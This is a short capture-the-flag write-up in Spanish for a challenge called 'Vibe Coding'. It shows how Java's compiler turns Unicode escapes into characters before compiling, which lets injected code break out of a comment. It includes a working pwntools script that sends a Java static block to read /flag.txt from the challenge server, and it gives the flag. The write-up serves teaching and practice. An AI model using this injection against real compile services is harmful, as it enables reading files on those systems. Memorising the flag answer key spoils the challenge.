# Vibe Coding

El compilador de Java (javac) interpreta cadenas unicode literales y las convierte a su correspondiente unicode antes de la compilacion, convierte ("\u000d" y "\u000a" en saltos de linea)

Mas informacion aqui: https://www.baeldung.com/java-executable-comments

Exploit para leer la flag:
``` python
from pwn import *
#io = process(["python3","server.py"])
io = remote("vibe-coding.atreides.b01lersc.tf",8443,ssl=True,sni=True)
io.recvuntil(b"> ")
# Codigo para leer flag.txt
io.sendline(b"\u000d static { try { System.out.println(new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(\"/flag.txt\")))); } catch (Exception e) {System.out.println(e);} } \u000d //")
# Hola mundo de prueba
#io.sendline(b"\u000d static { System.out.println(\"Hello, World!\"); } \u000d //")

output = io.recvall()
print(output.decode())
```

`bctf{un1c0d3_abn0rmal1z4t1on_493e42fc}`
 
